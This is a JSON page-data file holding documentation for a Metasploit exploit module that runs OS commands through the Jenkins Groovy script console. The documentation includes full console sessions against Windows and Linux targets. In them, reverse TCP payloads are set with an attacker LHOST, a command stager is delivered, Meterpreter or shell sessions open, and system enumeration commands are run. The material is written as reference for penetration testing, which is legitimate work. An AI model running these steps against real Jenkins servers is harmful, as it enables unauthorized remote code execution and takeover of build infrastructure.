{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/jenkins_script_console","result":{"data":{"moduleMetadataJson":{"id":"6ef12dca-ef9e-5e73-b452-da7ff58cb3e5","name":"Jenkins-CI Script-Console Java Execution","fullname":"exploit/multi/http/jenkins_script_console","description":"This module uses the Jenkins-CI Groovy script console to execute\n        OS commands using Java.","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/jenkins_script_console","documentationSlug":"/modules/documentation/exploit/multi/http/jenkins_script_console","referencesSlug":"/modules/references/exploit/multi/http/jenkins_script_console"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Jenkins can be downloaded from <a href=\"https://jenkins.io/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">jenkins.io</a> where\nbinaries are available for a variety of operating systems. Both LTS and weekly\nbuilds are available.</p>\n<p>  Default settings have the script console enabled and require a valid user\naccount in order to access it. A known account can be used with this module by\nsetting the <code class=\"language-text\">USERNAME</code> and <code class=\"language-text\">PASSWORD</code> options.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/jenkins_script_console</code></li>\n<li>Do: <code class=\"language-text\">set RHOST [target host]</code></li>\n<li>Do: <code class=\"language-text\">set TARGET [target id]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>TARGETURI</strong></p>\n<p>  The path to the target instance of Jenkins.</p>\n<p>  <strong>USERNAME</strong></p>\n<p>  A username to an account that has access to the script console. This is only\nnecessary if the Jenkins instance has been configured to require\nauthentication.</p>\n<p>  <strong>PASSWORD</strong></p>\n<p>  A password to an account that has access to the script console. This is only\nnecessary if the Jenkins instance has been configured to require\nauthentication and you aren't using an API_TOKEN (see below).</p>\n<p>  <strong>API_TOKEN</strong></p>\n<p>  An API token to an account that has access to the script console. This is only\nnecessary if the Jenkins instance has been configured to require\nauthentication and you aren't using a PASSWORD (see above).</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>  Example usage against a Windows 7 SP1 x64 bit target running Jenkins 2.19.1.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/jenkins_script_console\nmsf exploit(jenkins_script_console) &gt; set TARGETURI /\nTARGETURI =&gt; /\nmsf exploit(jenkins_script_console) &gt; set USERNAME steiner\nUSERNAME =&gt; steiner\nmsf exploit(jenkins_script_console) &gt; set PASSWORD I&lt;3msf!\nPASSWORD =&gt; I&lt;3msf!\nmsf exploit(jenkins_script_console) &gt; set RHOST 192.168.254.126\nRHOST =&gt; 192.168.254.126\nmsf exploit(jenkins_script_console) &gt; set RPORT 8080\nRPORT =&gt; 8080\nmsf exploit(jenkins_script_console) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(jenkins_script_console) &gt; set LHOST 192.168.254.132\nLHOST =&gt; 192.168.254.132\nmsf exploit(jenkins_script_console) &gt; exploit\n\n[*] [2016.10.29-18:43:07] Started reverse TCP handler on 192.168.254.132:4444\n[*] [2016.10.29-18:43:07] Checking access to the script console\n[*] [2016.10.29-18:43:07] Logging in...\n[*] [2016.10.29-18:43:07] Using CSRF token: &#39;9623d245b9d60b5ceda72e2d3613431c&#39; (Jenkins-Crumb style)\n[*] [2016.10.29-18:43:07] 192.168.254.126:8080 - Sending command stager...\n[*] [2016.10.29-18:43:08] Command Stager progress -   2.06% done (2048/99626 bytes)\n[*] [2016.10.29-18:43:08] Command Stager progress -   4.11% done (4096/99626 bytes)\n[*] [2016.10.29-18:43:08] Command Stager progress -   6.17% done (6144/99626 bytes)\n[*] [2016.10.29-18:43:09] Command Stager progress -   8.22% done (8192/99626 bytes)\n[*] [2016.10.29-18:43:09] Command Stager progress -  10.28% done (10240/99626 bytes)\n[*] [2016.10.29-18:43:09] Command Stager progress -  12.33% done (12288/99626 bytes)\n[*] [2016.10.29-18:43:10] Command Stager progress -  14.39% done (14336/99626 bytes)\n[*] [2016.10.29-18:43:10] Command Stager progress -  16.45% done (16384/99626 bytes)\n[*] [2016.10.29-18:43:10] Command Stager progress -  18.50% done (18432/99626 bytes)\n[*] [2016.10.29-18:43:11] Command Stager progress -  20.56% done (20480/99626 bytes)\n[*] [2016.10.29-18:43:11] Command Stager progress -  22.61% done (22528/99626 bytes)\n[*] [2016.10.29-18:43:11] Command Stager progress -  24.67% done (24576/99626 bytes)\n[*] [2016.10.29-18:43:12] Command Stager progress -  26.72% done (26624/99626 bytes)\n[*] [2016.10.29-18:43:12] Command Stager progress -  28.78% done (28672/99626 bytes)\n[*] [2016.10.29-18:43:12] Command Stager progress -  30.84% done (30720/99626 bytes)\n[*] [2016.10.29-18:43:13] Command Stager progress -  32.89% done (32768/99626 bytes)\n[*] [2016.10.29-18:43:13] Command Stager progress -  34.95% done (34816/99626 bytes)\n[*] [2016.10.29-18:43:13] Command Stager progress -  37.00% done (36864/99626 bytes)\n[*] [2016.10.29-18:43:14] Command Stager progress -  39.06% done (38912/99626 bytes)\n[*] [2016.10.29-18:43:14] Command Stager progress -  41.11% done (40960/99626 bytes)\n[*] [2016.10.29-18:43:14] Command Stager progress -  43.17% done (43008/99626 bytes)\n[*] [2016.10.29-18:43:15] Command Stager progress -  45.23% done (45056/99626 bytes)\n[*] [2016.10.29-18:43:15] Command Stager progress -  47.28% done (47104/99626 bytes)\n[*] [2016.10.29-18:43:15] Command Stager progress -  49.34% done (49152/99626 bytes)\n[*] [2016.10.29-18:43:16] Command Stager progress -  51.39% done (51200/99626 bytes)\n[*] [2016.10.29-18:43:16] Command Stager progress -  53.45% done (53248/99626 bytes)\n[*] [2016.10.29-18:43:17] Command Stager progress -  55.50% done (55296/99626 bytes)\n[*] [2016.10.29-18:43:17] Command Stager progress -  57.56% done (57344/99626 bytes)\n[*] [2016.10.29-18:43:17] Command Stager progress -  59.61% done (59392/99626 bytes)\n[*] [2016.10.29-18:43:18] Command Stager progress -  61.67% done (61440/99626 bytes)\n[*] [2016.10.29-18:43:18] Command Stager progress -  63.73% done (63488/99626 bytes)\n[*] [2016.10.29-18:43:18] Command Stager progress -  65.78% done (65536/99626 bytes)\n[*] [2016.10.29-18:43:19] Command Stager progress -  67.84% done (67584/99626 bytes)\n[*] [2016.10.29-18:43:19] Command Stager progress -  69.89% done (69632/99626 bytes)\n[*] [2016.10.29-18:43:19] Command Stager progress -  71.95% done (71680/99626 bytes)\n[*] [2016.10.29-18:43:20] Command Stager progress -  74.00% done (73728/99626 bytes)\n[*] [2016.10.29-18:43:20] Command Stager progress -  76.06% done (75776/99626 bytes)\n[*] [2016.10.29-18:43:20] Command Stager progress -  78.12% done (77824/99626 bytes)\n[*] [2016.10.29-18:43:21] Command Stager progress -  80.17% done (79872/99626 bytes)\n[*] [2016.10.29-18:43:21] Command Stager progress -  82.23% done (81920/99626 bytes)\n[*] [2016.10.29-18:43:21] Command Stager progress -  84.28% done (83968/99626 bytes)\n[*] [2016.10.29-18:43:22] Command Stager progress -  86.34% done (86016/99626 bytes)\n[*] [2016.10.29-18:43:22] Command Stager progress -  88.39% done (88064/99626 bytes)\n[*] [2016.10.29-18:43:22] Command Stager progress -  90.45% done (90112/99626 bytes)\n[*] [2016.10.29-18:43:23] Command Stager progress -  92.51% done (92160/99626 bytes)\n[*] [2016.10.29-18:43:23] Command Stager progress -  94.56% done (94208/99626 bytes)\n[*] [2016.10.29-18:43:23] Command Stager progress -  96.62% done (96256/99626 bytes)\n[*] [2016.10.29-18:43:24] Command Stager progress -  98.67% done (98304/99626 bytes)\n[*] [2016.10.29-18:43:24] Sending stage (957999 bytes) to 192.168.254.126\n[*] [2016.10.29-18:43:24] Command Stager progress - 100.00% done (99626/99626 bytes)\n[*] Meterpreter session 1 opened (192.168.254.132:4444 -&gt; 192.168.254.126:49258) at 2016-10-29 18:43:26 -0400\n\nmeterpreter &gt; sysinfo\nComputer        : PWNME-PC\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x64 (Current Process is WOW64)\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/win32\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Example usage against a Linux x64 bit target running Jenkins 2.46.3.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/jenkins_script_console\nmsf exploit(jenkins_script_console) &gt; set RHOST 172.17.0.1\nRHOST =&gt; 172.17.0.1\nmsf exploit(jenkins_script_console) &gt; set RPORT 8080\nRPORT =&gt; 8080\nmsf exploit(jenkins_script_console) &gt; set TARGETURI /\nTARGETURI =&gt; /\nmsf exploit(jenkins_script_console) &gt; set USERNAME admin\nUSERNAME =&gt; admin\nmsf exploit(jenkins_script_console) &gt; set API_TOKEN 24e0b80d009ed12590ff85866d88c00d\nAPI_TOKEN =&gt; 24e0b80d009ed12590ff85866d88c00d\nmsf exploit(jenkins_script_console) &gt; set TARGET 1\nTARGET =&gt; 1\nmsf exploit(jenkins_script_console) &gt; set PAYLOAD linux/x86/shell/reverse_tcp\nPAYLOAD =&gt; linux/x86/shell/reverse_tcp\nmsf exploit(jenkins_script_console) &gt; set LHOST 10.0.2.4\nLHOST =&gt; 10.0.2.4\nmsf exploit(jenkins_script_console) &gt; exploit\n\n[*] Started reverse TCP handler on 10.0.2.4:4444 \n[*] Checking access to the script console\n[*] Authenticating with token...\n[*] Using CSRF token: &#39;d41639a6f5721760a8ee3df5d6a71eec&#39; (Jenkins-Crumb style)\n[*] 172.17.0.1:8080 - Sending Linux stager...\n[*] Sending stage (36 bytes) to 172.17.0.2\n[*] Command shell session 1 opened (10.0.2.4:4444 -&gt; 172.17.0.2:53962) at 2017-06-19 16:55:42 -0500\n[!] Deleting /tmp/AsqL5Pg payload file\n\nwhoami\njenkins\nid\nuid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)\nuname -a\nLinux b4b4e715101e 4.4.0-79-generic #100-Ubuntu SMP Wed May 17 19:58:14 UTC 2017 x86_64 GNU/Linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"6ef12dca-ef9e-5e73-b452-da7ff58cb3e5"}}}